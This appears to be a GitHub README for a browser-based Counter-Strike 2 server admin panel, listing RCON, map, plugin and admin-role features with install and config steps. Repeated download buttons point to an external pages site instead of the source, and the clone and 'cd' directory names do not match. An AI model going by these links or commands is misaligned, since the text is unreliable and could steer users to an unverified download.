# OpenCS2 Panel - Server Management Panel 2026

> A browser-based admin panel for Counter-Strike 2 dedicated servers, built to deliver live RCON control, plugin handling, and shared multi-user access in a Docker-ready setup.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaac-fisher2001/opencs2-server-panel?style=flat-square)](https://github.com/isaac-fisher2001/opencs2-server-panel)

---

<p align="center">
  <a href="https://isaac-fisher2001.github.io/opencs2-server-panel/">
    <img src="https://img.shields.io/badge/Download-OpenCS2%20Panel%20Latest-brightgreen?style=for-the-badge" alt="Download OpenCS2 Panel">
  </a>
</p>

> **[Direct Download - OpenCS2 Panel v1.0](https://isaac-fisher2001.github.io/opencs2-server-panel/)**

---

[Download Latest Build](https://isaac-fisher2001.github.io/opencs2-server-panel/)

---

## What OpenCS2 Panel Does

OpenCS2 Panel is a web-first control center made for Counter-Strike 2 server admins. Instead of relying on command-line routines, it gives you a straightforward dashboard for checking live server state, changing maps, managing plugins, and administering permissions from a polished browser UI. It fits both compact community servers and larger hosting setups that need dependable, real-time oversight.

The platform brings together CounterStrikeSharp plugin support, Metamod, and CS:S management, while also offering multi-user access with role-based permissions. Whether you are running one CS2 server or coordinating several Docker containers, OpenCS2 Panel provides a single place to manage them. Built-in audit logging plus English and Turkish language support make it practical for different communities without demanding advanced technical experience.

---

## Core Capabilities

- **Live RCON Status** - View server health, player numbers, and live metrics straight from the browser.
- **Map Management** - Add, delete, and switch CS2 maps with just a few actions.
- **Plugin Manager** - Deploy and set up CounterStrikeSharp plugins without editing files manually.
- **Admin Management** - Create, update, or remove server admins from a simple interface.
- **Metamod & CS:S Manager** - Manage Metamod and CS:S components together with your plugin stack.
- **Multi-User Access** - Define roles and permissions so each team member gets the right level of control.
- **Audit Log** - Record configuration changes and admin operations for traceability.
- **Internationalization** - Full support for English and Turkish to help distributed teams work comfortably.

---

## Installation

Clone the repository to your server environment:

```bash
git clone https://github.com/isaac-fisher2001/opencs2-server-panel.git
cd OpenCS2-panel
```

For Docker deployment, use the provided Dockerfile or pull the prebuilt image. For manual setup, ensure your web server points to the `public` directory and configure the database connection in the settings file.

Open the panel by visiting your server's IP address or domain in a browser. The initial setup wizard will walk you through creating an admin account and linking the panel to your CS2 server.

---

## How to Use It

After installation, sign in with your admin credentials. The dashboard shows the connected CS2 server's current state, including player count, map name, and uptime.

**Common workflows:**

1. **Change a map** - Open Maps, pick a map from your library, and click "Change Map."
2. **Install a plugin** - Go to Plugins, upload a CounterStrikeSharp plugin file, and enable it right away.
3. **Add an admin** - Open Admin Management, enter a SteamID, and assign a role with the needed permissions.
4. **Review activity** - Check the Audit Log to see what changed and who made the change.

All of these tasks are handled through the web interface, so SSH access and direct RCON commands are not required.

---

## Configuration

Configuration files are stored in the `config/` directory. Key settings include:

- **Database connection** - MySQL or SQLite credentials for storing user accounts and logs.
- **RCON credentials** - Host, port, and password for connecting to your CS2 server.
- **Language preference** - Set to `en` or `tr` for the interface language.
- **Docker environment variables** - For containerized setups, use the provided `.env` template.

Example configuration block:

```env
DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=opencs2
DB_USERNAME=admin
DB_PASSWORD=secure_password
RCON_HOST=your-server-ip
RCON_PORT=27015
RCON_PASSWORD=your-rcon-password
```

---

## Requirements

- **Web Server** - Apache, Nginx, or any PHP-compatible server (PHP 8.0+ recommended)
- **Database** - MySQL 5.7+ or SQLite
- **Docker** - Optional but recommended for containerized deployment
- **CS2 Server** - A running Counter-Strike 2 dedicated server with RCON enabled
- **Storage** - At least 500 MB for the panel files and plugin storage

---

## FAQ

**How do I update the panel?**  
Fetch the latest repository changes and apply any required database migrations. Docker users can rebuild the image or pull the updated tag.

**Can I use this with multiple CS2 servers?**  
Yes. You can set up multiple server connections from the settings page, and each one is shown as its own dashboard tab.

**Is there a demo or trial?**  
Look on the project website for a live demo instance. You can also test it locally by deploying with Docker.

**What if I encounter an error?**  
Check the audit log and the server logs in `storage/logs`. Then open a GitHub issue with your setup details and the error message.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
